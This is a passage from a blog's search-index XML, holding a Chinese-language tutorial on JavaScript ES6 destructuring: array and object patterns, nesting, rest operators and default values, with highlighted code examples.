class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">// a = &#x27;h&#x27;</span></span><br><span class="line"><span class="comment">// b = &#x27;e&#x27;</span></span><br><span class="line"><span class="comment">// c = &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">// d = &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">// e = &#x27;o&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="yaEro"></a></p><h3 id="解构默认值"><a href="#解构默认值" class="headerlink" title="解构默认值"></a>解构默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a = <span class="number">2</span>] = [<span class="literal">undefined</span>]; <span class="comment">// a = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当解构模式有匹配结果，且匹配结果是 undefined 时，会触发默认值作为返回结果。</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [];     <span class="comment">// a = 3, b = 3</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [<span class="number">1</span>];    <span class="comment">// a = 1, b = 1</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [<span class="number">1</span>, <span class="number">2</span>]; <span class="comment">// a = 1, b = 2</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">a 与 b 匹配结果为 undefined ，触发默认值：a = 3; b = a =3</span></span><br><span class="line"><span class="comment">a 正常解构赋值，匹配结果：a = 1，b 匹配结果 undefined ，触发默认值：b = a =1</span></span><br><span class="line"><span class="comment">a 与 b 正常解构赋值，匹配结果：a = 1，b = 2</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//总结：有匹配的优先匹配，没有匹配的看默认</span></span><br></pre></td></tr></table></figure><p><a name="U4fzN"></a></p><h2 id="对象模型的解构"><a href="#对象模型的解构" class="headerlink" title="对象模型的解构"></a>对象模型的解构</h2><p><a name="Xpf5k"></a></p><h3 id="基本-1"><a href="#基本-1" class="headerlink" title="基本"></a>基本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// foo = &#x27;aaa&#x27;</span></span><br><span class="line"><span class="comment">// bar = &#x27;bbb&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> &#123; baz : foo &#125; = &#123; baz : <span class="string">&#x27;ddd&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// foo = &#x27;ddd&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="Y8wOM"></a></p><h3 id="可嵌套可忽略"><a href="#可嵌套可忽略" class="headerlink" title="可嵌套可忽略"></a>可嵌套可忽略</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line"><span class="comment">// x = &#x27;hello&#x27;</span></span><br><span class="line"><span class="comment">// y = &#x27;world&#x27;</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123;  &#125;] &#125; = obj;</span><br><span class="line"><span class="comment">// x = &#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="ZhnlL"></a></p><h3 id="不完全解构-1"><a href="#不完全解构-1" class="headerlink" title="不完全解构"></a>不完全解构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [&#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [&#123; y &#125;, x ] &#125; = obj;</span><br><span class="line"><span class="comment">// x = undefined</span></span><br><span class="line"><span class="comment">// y = &#x27;world&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="RlJE6"></a></p><h3 id="剩余运算符-1"><a href="#剩余运算符-1" class="headerlink" title="剩余运算符"></a>剩余运算符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;a, b, ...rest&#125; = &#123;<span class="attr">a</span>: <span class="number">10</span>, <span class="attr">b</span>: <span class="number">20</span>, <span class="attr">c</span>: <span class="number">30</span>, <span class="attr">d</span>: <span class="number">40</span>&#125;;</span><br><span class="line"><span class="comment">// a = 10</span></span><br><span class="line"><span class="comment">// b = 20</span></span><br><span class="line"><span class="comment">// rest = &#123;c: 30, d: 40&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="cpMKP"></a></p><h3 id="解构默认值-1"><a href="#解构默认值-1" class="headerlink" title="解构默认值"></a>解构默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;a = <span class="number">10</span>, b = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="comment">// a = 3; b = 5;</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">a</span>: aa = <span class="number">10</span>, <span class="attr">b</span>: bb = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="comment">// aa = 3; bb = 5;</span></span><br></pre></td></tr></table></figure><p><a href="https://fangyinghang.com/es-6-tutorials/">https://fangyinghang.com/es-6-tutorials/</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
